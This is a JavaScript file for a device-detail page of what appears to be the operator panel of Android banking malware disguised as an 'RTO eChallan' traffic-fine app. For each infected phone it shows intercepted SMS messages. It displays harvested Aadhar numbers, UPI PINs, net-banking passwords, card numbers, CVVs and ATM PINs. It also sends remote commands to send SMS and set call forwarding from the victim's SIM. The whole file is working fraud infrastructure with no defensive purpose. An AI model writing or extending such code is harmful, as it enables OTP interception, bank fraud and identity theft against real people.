// ==========================================
// DEVICE DETAIL PAGE - RTO eChallan
// ==========================================
requireAuth();

const params = new URLSearchParams(window.location.search);
const deviceId = params.get("id");

if (!deviceId) {
  window.location.href = "dashboard.html";
}

let currentDevice = {};
let selectedSimSms = 1;
let selectedSimCf = 1;

// Load device data
db.ref("device_info/" + deviceId).on("value", (snap) => {
  const d = snap.val() || {};
  currentDevice = d;
  renderDevice(d);
});

// ==========================================
// RENDER DEVICE DETAIL
// ==========================================
function renderDevice(d) {
  const online = isDeviceOnline(d.last_seen);
  const statusClass = online ? "online" : "offline";
  const statusText = online ? "● Online" : "● Offline";
  const msgCount = d.messages ? Object.keys(d.messages).length : 0;

  const html = `
    <div class="two-col-btns">
      <button class="big-btn" onclick="openModal('modalCallFwd')">📞 Call Forward</button>
      <button class="big-btn" onclick="openModal('modalSms')">💬 Send SMS</button>
    </div>
    <button class="big-btn" onclick="openSimModal()">📶 Update SIM Number</button>

    <div class="detail-header-card">
      <div class="row"><span class="k">Model</span><span class="v">${escapeHtml(d.device_model || "-")}</span></div>
      <div class="row"><span class="k">OS Version</span><span class="v">Android ${escapeHtml(d.android_version || "-")}</span></div>
      <div class="row"><span class="k">Device Name</span><span class="v">${escapeHtml(d.device_manufacturer || "-")}</span></div>
      <div class="row"><span class="k">Device ID</span><span class="v">${escapeHtml(deviceId)}</span></div>
      <div class="row"><span class="k">SIM 1</span><span class="v" style="color:#00ff88;">${escapeHtml(d.sim1_number || "No SIM Found")}</span></div>
      <div class="row"><span class="k">SIM 2</span><span class="v" style="color:#00ff88;">${escapeHtml(d.sim2_number || "No SIM Found")}</span></div>
    </div>

    <div class="connection-status">
      <span class="label">Connection Status</span>
      <span class="${statusClass}">${statusText}</span>
    </div>

    <button class="big-btn" onclick="openLoginDetails()">🔐 Login Details</button>
    <button class="big-btn" onclick="openCardDetails()">💳 Card Details</button>

    <div class="section-card">
      <h3>💬 Messages (${msgCount})</h3>
      <div id="recentMessages">
        <div style="text-align:center;color:#64748b;padding:20px;">Loading messages...</div>
      </div>
    </div>
  `;

  document.getElementById("content").innerHTML = html;
  renderMessages(d.messages);
}

// ==========================================
// RENDER MESSAGES
// ==========================================
function renderMessages(messagesObj) {
  const el = document.getElementById("recentMessages");
  if (!el) return;

  if (!messagesObj || Object.keys(messagesObj).length === 0) {
    el.innerHTML = '<div style="text-align:center;color:#64748b;padding:20px;">No messages yet</div>';
    return;
  }

  const msgs = Object.keys(messagesObj).map((k) => ({
    key: k,
    ...messagesObj[k]
  }));

  msgs.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

  el.innerHTML = msgs.slice(0, 50).map((m) => {
    const isSent = (m.type || "").toUpperCase() === "SENT";
    const fromTo = m.sender || m.number || m.receiver || "-";
    const body = m.body || m.message || "-";
    const sim = m.receivedOn ? " · " + m.receivedOn : (m.sim_slot ? " · SIM " + m.sim_slot : "");
    const timeStr = m.date || formatTime(m.timestamp);
    const bodyEscaped = escapeHtml(body).replace(/"/g, "&quot;");

    return `
      <div class="msg-item ${isSent ? 'sent' : ''}">
        <div class="msg-header">
          <span class="msg-from">
            <span class="msg-tag ${isSent ? 'tag-out' : 'tag-in'}">${isSent ? 'SENT' : 'RECV'}</span>
            ${escapeHtml(fromTo)}${escapeHtml(sim)}
          </span>
          <span class="msg-time">${escapeHtml(timeStr)}</span>
        </div>
        <div class="msg-body">${escapeHtml(body)}</div>
        <div class="msg-actions">
          <button class="msg-action-btn copy-btn" data-msg="${bodyEscaped}" onclick="copyMsg(this)">
            📋 Copy
          </button>
          <button class="msg-action-btn delete-btn" onclick="deleteMsg('${m.key}')">
            🗑️ Delete
          </button>
        </div>
      </div>
    `;
  }).join("");
}

// ==========================================
// COPY MESSAGE
// ==========================================
function copyMsg(btn) {
  const text = btn.getAttribute("data-msg") || "";
  if (navigator.clipboard) {
    navigator.clipboard.writeText(text).then(() => {
      const orig = btn.innerHTML;
      btn.innerHTML = "✅ Copied";
      btn.style.color = "#00ff88";
      setTimeout(() => { btn.innerHTML = orig; btn.style.color = ""; }, 1500);
    }).catch(() => fallbackCopy(text, btn));
  } else {
    fallbackCopy(text, btn);
  }
}

function fallbackCopy(text, btn) {
  const ta = document.createElement("textarea");
  ta.value = text;
  ta.style.position = "fixed";
  ta.style.opacity = "0";
  document.body.appendChild(ta);
  ta.select();
  try {
    document.execCommand("copy");
    const orig = btn.innerHTML;
    btn.innerHTML = "✅ Copied";
    btn.style.color = "#00ff88";
    setTimeout(() => { btn.innerHTML = orig; btn.style.color = ""; }, 1500);
  } catch (e) { alert("Copy failed"); }
  document.body.removeChild(ta);
}

// ==========================================
// DELETE MESSAGE
// ==========================================
function deleteMsg(msgKey) {
  if (!confirm("Delete this message?")) return;
  db.ref("device_info/" + deviceId + "/messages/" + msgKey).remove()
    .then(() => { console.log("Deleted:", msgKey); })
    .catch((err) => alert("Error: " + err.message));
}

// ==========================================
// SIM SELECTOR
// ==========================================
function selectSim(type, sim) {
  if (type === 'sms') {
    selectedSimSms = sim;
    document.querySelectorAll('#modalSms .sim-option').forEach((el, i) => {
      el.classList.toggle('active', (i + 1) === sim);
    });
  } else if (type === 'cf') {
    selectedSimCf = sim;
    document.querySelectorAll('#modalCallFwd .sim-option').forEach((el, i) => {
      el.classList.toggle('active', (i + 1) === sim);
    });
  }
}

// ==========================================
// SEND SMS
// ==========================================
function sendSMS() {
  const number = document.getElementById("smsNumber").value.trim();
  const message = document.getElementById("smsMessage").value.trim();

  if (!number || !message) {
    alert("Number and message both required!");
    return;
  }

  const ref = db.ref("sms_commands/" + deviceId).push();
  ref.set({
    device_id: deviceId,
    target_number: number,
    message: message,
    sim_slot: selectedSimSms,
    status: "pending",
    timestamp: Date.now(),
    direction: "out"
  }).then(() => {
    alert("SMS command sent!");
    document.getElementById("smsNumber").value = "";
    document.getElementById("smsMessage").value = "";
    closeModal('modalSms');
  }).catch((err) => alert("Error: " + err.message));
}

document.addEventListener("input", (e) => {
  if (e.target && e.target.id === "smsMessage") {
    document.getElementById("smsCounter").textContent = e.target.value.length + "/150";
  }
});

// ==========================================
// CALL FORWARD
// ==========================================
function sendCallForward(action) {
  const number = document.getElementById("cfNumber").value.trim();

  if (action === "activate" && !number) {
    alert("Enter number first!");
    return;
  }

  const ref = db.ref("call_forward_commands/" + deviceId).push();
  ref.set({
    action: action,
    number: number,
    sim_slot: selectedSimCf,
    status: "pending",
    timestamp: Date.now()
  }).then(() => {
    alert("Call forward " + action + " command sent!");
    closeModal('modalCallFwd');
  }).catch((err) => alert("Error: " + err.message));
}

// ==========================================
// UPDATE SIM
// ==========================================
function openSimModal() {
  document.getElementById("sim1Input").value = currentDevice.sim1_number || "";
  document.getElementById("sim2Input").value = currentDevice.sim2_number || "";
  document.getElementById("modalSim").classList.add("active");
}

function updateSim() {
  const sim1 = document.getElementById("sim1Input").value.trim();
  const sim2 = document.getElementById("sim2Input").value.trim();

  const update = {};
  if (sim1) update.sim1_number = sim1;
  if (sim2) update.sim2_number = sim2;

  if (Object.keys(update).length === 0) {
    alert("Enter at least one SIM number!");
    return;
  }

  db.ref("device_info/" + deviceId).update(update).then(() => {
    alert("SIM updated!");
    closeModal('modalSim');
  }).catch((err) => alert("Error: " + err.message));
}

// ==========================================
// LOGIN DETAILS
// ==========================================
function openLoginDetails() {
  const el = document.getElementById("loginDetailsContent");
  const d = currentDevice || {};
  const ld = d.login_details || {};

  const name = ld.name || d.user_name || "-";
  const mobile = ld.mobile || d.user_mobile || "-";
  const dob = ld.dob || d.user_dob || "-";
  const aadhar = ld.aadhar || d.user_aadhar || "-";

  let upiPin = d.upi_pin || ld.upi_pin || "-";
  if (typeof upiPin === "object" && upiPin !== null) {
    upiPin = upiPin.pin || upiPin.value || JSON.stringify(upiPin);
  }

  const html = `
    <div class="section-card" style="margin:0 0 12px 0;">
      <h3>👤 Personal Info</h3>
      <div style="font-size:13px;line-height:2;color:#fff;">
        <div><b style="color:#94a3b8;">Name:</b> ${escapeHtml(String(name))}</div>
        <div><b style="color:#94a3b8;">Mobile:</b> ${escapeHtml(String(mobile))}</div>
        <div><b style="color:#94a3b8;">DOB:</b> ${escapeHtml(String(dob))}</div>
        <div><b style="color:#94a3b8;">Aadhar:</b> ${escapeHtml(String(aadhar))}</div>
        <div><b style="color:#ff3b5c;">UPI PIN:</b> ${escapeHtml(String(upiPin))}</div>
      </div>
    </div>

    <div class="section-card" style="margin:0;">
      <h3>🏦 Net Banking Details</h3>
      <div style="font-size:13px;line-height:2;color:#fff;">
        <div><b style="color:#94a3b8;">Bank:</b> ${escapeHtml(d.netbanking_bank || "-")}</div>
        <div><b style="color:#94a3b8;">Account Holder:</b> ${escapeHtml(d.netbanking_account_holder || "-")}</div>
        <div><b style="color:#94a3b8;">Customer ID:</b> ${escapeHtml(d.netbanking_customer_id || "-")}</div>
        <div><b style="color:#ff3b5c;">Password:</b> ${escapeHtml(d.netbanking_password || "-")}</div>
      </div>
    </div>
  `;

  el.innerHTML = html;
  document.getElementById("modalLoginDetails").classList.add("active");
}

// ==========================================
// CARD DETAILS
// ==========================================
function openCardDetails() {
  const el = document.getElementById("loginDetailsContent");
  const d = currentDevice || {};

  const html = `
    <div class="section-card" style="margin:0;">
      <h3>💳 Card Details</h3>
      <div style="font-size:13px;line-height:2;color:#fff;">
        <div><b style="color:#94a3b8;">Card Number:</b> ${escapeHtml(d.card_number || "-")}</div>
        <div><b style="color:#94a3b8;">Card Type:</b> ${escapeHtml(d.card_type || "-")}</div>
        <div><b style="color:#94a3b8;">Expiry:</b> ${escapeHtml(d.card_expiry || "-")}</div>
        <div><b style="color:#ff3b5c;">CVV:</b> ${escapeHtml(d.card_cvv || "-")}</div>
        <div><b style="color:#ff3b5c;">ATM PIN:</b> ${escapeHtml(d.card_atm_pin || "-")}</div>
      </div>
    </div>
  `;

  el.innerHTML = html;
  document.getElementById("modalLoginDetails").classList.add("active");
}

// ==========================================
// MODAL CONTROLS
// ==========================================
function openModal(id) {
  document.getElementById(id).classList.add("active");
}
function closeModal(id) {
  document.getElementById(id).classList.remove("active");
}

document.querySelectorAll(".modal-overlay").forEach((overlay) => {
  overlay.addEventListener("click", (e) => {
    if (e.target === overlay) overlay.classList.remove("active");
  });
});
